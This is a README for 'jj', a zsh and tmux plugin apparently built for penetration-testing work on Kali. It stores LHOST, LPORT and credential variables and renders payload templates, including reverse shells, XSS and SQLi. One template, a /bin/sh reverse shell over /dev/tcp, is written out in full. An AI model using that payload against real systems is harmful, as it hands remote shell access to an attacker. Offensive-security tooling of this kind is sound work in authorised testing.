# jj

`jj` is a zsh plugin for tmux-scoped workflow variables and payload rendering.

It stores `JJ_` variables in the current tmux session, lets each pane load
those variables when needed, and renders payload templates from fresh tmux
session values.

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload renderer = always reads fresh tmux session values
```

## Requirements

- zsh
- tmux
- fzf for `jji` and `jjp`
- coreutils for `base64`, used by OSC52 clipboard copy

Kali:

```zsh
sudo apt update
sudo apt install -y zsh tmux fzf coreutils
```

## Kali Deployment

`jj` is installed through `jj.plugin.zsh`. Put the whole project directory under
your zsh plugin directory. Do not source internal files under `lib/` directly.

### 1. Install Dependencies

```zsh
sudo apt update
sudo apt install -y zsh tmux fzf coreutils
```

### 2. Put Plugin Code In Place

For Kali + Oh My Zsh, put the plugin here:

```text
${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/jj
```

Source package path:

```text
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
```

The target `jj` directory must contain the whole plugin package:

```text
jj/
  jj.plugin.zsh
  lib/
  payloads/
  doc/
  README.md
```

### 3. Enable The Plugin

Edit `~/.zshrc` and add `jj` to `plugins`:

```zsh
plugins=(git jj)
```

No extra `export JJ_PAYLOAD_DIR=...` line is needed for the bundled payloads.
The plugin sets this automatically:

```text
JJ_PLUGIN_DIR=${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/jj
JJ_PAYLOAD_DIR=${JJ_PLUGIN_DIR}/payloads
```

Reload zsh:

```zsh
source ~/.zshrc
```

Confirm it loaded:

```zsh
type jj
type jjp
echo $JJ_PAYLOAD_DIR
```

## Payload Setup

By default, the plugin points `JJ_PAYLOAD_DIR` to the bundled payload directory:

```text
${JJ_PLUGIN_DIR}/payloads
```

You do not need to export `JJ_PAYLOAD_DIR` for the bundled payloads. Override it
only if you keep payloads somewhere else:

```zsh
export JJ_PAYLOAD_DIR=/path/to/payloads
```

## Clipboard Setup

For Kali over SSH, use OSC52 so `jjp` can copy rendered payloads to the local
terminal clipboard without X server or Wayland clipboard tools:

```zsh
export JJ_CLIP_BACKEND=osc52
```

Inside tmux, OSC52 also depends on your terminal and tmux clipboard/passthrough
settings. If it does not copy out, keep using the tmux buffer backend:

```zsh
export JJ_CLIP_CMD='tmux load-buffer -'
```

## Commands

| Command | Wrapper | Purpose |
| --- | --- | --- |
| `jj set NAME VALUE` | `jjs NAME VALUE` | Set internal `JJ_NAME` in tmux and export `NAME` in this shell |
| `jj set` | `jjs` | Open a TUI to choose `DOMAIN/LHOST/RHOST/LPORT/RPORT` and type a value |
| `jj load` | `jjl` | Load tmux variables into this shell without the internal `JJ_` prefix |
| `jj interactive` | `jji` | Select tmux variables with fzf and load them without the internal `JJ_` prefix |
| `jj variable [PATTERN]` | `jjv [PATTERN]` | Print tmux variables without the internal `JJ_` prefix, filtered by name |
| `jj variable host` | `jjv host` | Print configured host variables as name/value lines |
| `jj variable cred` | `jjv cred` | Print configured credential variables as name/value lines |
| `jj payload [CATEGORY]` | `jjp [CATEGORY]` | Select, render, copy, and print a payload |
| `jj unset NAME [...]` | | Remove `JJ_` variables from tmux and this shell |
| `jj help [COMMAND]` | `jjh [COMMAND]` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
jjs
jjs LHOST 192.168.45.192
jjs LPORT 443
jjs DOMAIN example.test

jjv
jjv host
jjv cred
jjp linux
```

`JJ_` is only an internal tmux namespace. User-facing commands and shell exports
use names without that prefix, such as `$LHOST` and `$DOMAIN`.

`jjp` reads tmux session variables directly. Another pane can render a payload
without running `jjl` first, even though `echo $LHOST` still needs `jjl`.

`jjv host` prints configured host variables as two-line pairs:

```text
LHOST
192.168.45.192
LPORT
443
```

`jjv cred` prints configured credential variables. It shows only values that are
set:

```text
USER1
alice
PASSWD1
secret
HASH1
...
```

## Payload Library

Payload files are plain text templates under `JJ_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  xss/
    basic-alert
```

Use `${JJ_NAME}` placeholders:

```text
/bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
```

Filter payloads by category:

```zsh
jjp
jjp shell
jjp linux
jjp windows
jjp xss
jjp sqli
```

## Documentation

- [Architecture](doc/architecture.md): plugin entrypoint, layer boundaries, and file responsibilities
- [Testing](doc/testing.md): syntax checks, tmux smoke tests, and cross-pane tests

## Help

```zsh
jj help
jj help set
jj help load
jj help variable
jj help payload
jj help unset
```
